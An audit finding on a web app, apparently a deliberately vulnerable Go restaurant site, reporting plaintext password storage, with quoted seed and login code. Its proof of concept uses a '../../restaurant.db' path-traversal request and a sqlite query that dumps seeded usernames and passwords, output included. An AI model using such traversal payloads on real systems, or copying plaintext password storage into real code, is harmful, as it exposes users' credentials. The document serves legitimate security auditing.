# C8 — Plaintext Password Storage at Rest (F-A1)

**Severity:** Critical  
**CWE:** CWE-256, CWE-257 | **OWASP:** A02:2021  
**Status:** Confirmed (cold-verified)  
**Source draft:** `piolium/findings-draft/p7-021-f-a1-plaintext-passwords.md`

## Summary

Passwords are stored in plaintext in the `users.password` SQLite column. Login comparison uses `password = ?` equality against the stored plaintext. No hashing library is imported.

This is the **root cause** underlying V08 (password leak in API responses). The README acknowledges this as design intent, but conflates the storage choice with the API leak.

## Vulnerable Code

`db/seed.go::seedUsers`:
```go
{"admin", "admin@thelocalplate.com", "Admin@2024!", "admin"},
// ...
db.DB.Exec(`INSERT OR IGNORE INTO users (id, username, email, password, role) VALUES (?, ?, ?, ?, ?)`,
    i+1, u.username, u.email, u.password, u.role)
```

`handlers/auth.go::Login`:
```go
db.DB.QueryRow("SELECT id, username, email, password, role FROM users WHERE email=? AND password=?",
    body.Email, body.Password)
```

`go.sum` contains no bcrypt/scrypt/argon2 dependency.

## Impact

- Any DB compromise yields all credentials directly, without cracking.
- Database exfiltration via V13 path traversal (`?name=../../restaurant.db`) yields the full user list with passwords.
- V08 (password leak) becomes a full credential disclosure rather than a hash leak requiring offline cracking.

## PoC

```bash
# Direct DB download via V13
curl "http://localhost:4443/api/files?name=../../restaurant.db" -o stolen.db
sqlite3 stolen.db "SELECT username, password FROM users;"
```

Output:
```
admin|Admin@2024!
alice|Password123
bob|Qwerty456
carol|Secret789
dave|Dave1234
```

## Cold Verification

Re-read source: confirmed no hashing library imported. `models.User.Password` is `string`, selected with the rest of the row in both Login and GetProfile. The seed contains recognizable plaintext values matching the README documentation.
